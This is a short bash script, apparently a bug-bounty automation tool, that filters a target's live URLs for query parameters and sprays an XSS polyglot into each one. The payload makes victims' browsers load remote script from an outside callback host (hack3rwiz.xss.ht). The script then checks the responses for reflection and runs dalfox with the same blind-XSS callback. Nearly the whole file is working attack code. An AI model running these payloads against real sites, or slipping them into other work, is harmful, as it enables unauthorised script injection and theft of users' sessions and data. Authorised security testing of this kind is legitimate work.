#!/bin/bash
RED='\e[38;5;196m'
GREEN='\e[38;5;149m'
mkdir xss > /dev/null 2>&1
cd xss
cat ../${1}.aliveURLs| grep -v FUZZ | sed 's/,,.*//g' | sed 's/,/\n/g' | grep ${1} | sed 's/^.*http/http/g' | grep "=" | egrep -iv ".(js|jpg|woff|pdf|png|jpeg|gif|css|tif|tiff|ttf|woff2|ico|svg|txt)" | qsreplace -a | qsreplace | kxss | tee -a kxsss 
cat kxsss| awk -F "on " '{print $2}' | sort -u | qsreplace "jaVasCript:/*-/*\`/*\\\`/*'/*\"/**/(/* */oNcliCk=eval('var a=document.createElement(\'script\');a.src=\'https://hack3rwiz.xss.ht\';document.body.appendChild(a)') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--\><script src=https://hack3rwiz.xss.ht></script>//>\x3e"> testpolyxss
for i in $(cat testpolyxss); do echo "[+] Running on $i\n" ; curl --silent --path-as-is --insecure $i | grep "hack3rwiz.xss.ht">/dev/null 2>&1 ; if [ $? -eq 0 ]; then echo -e "$RED Vulnerable\n" ; else echo -e "$GREEN Not Vulnerable\n"; fi ; done
cat kxsss| awk -F "on " '{print $2}' | sort -u | qsreplace | dalfox pipe  -b hack3rwiz.xss.ht -o dalfoxxs
cd ..
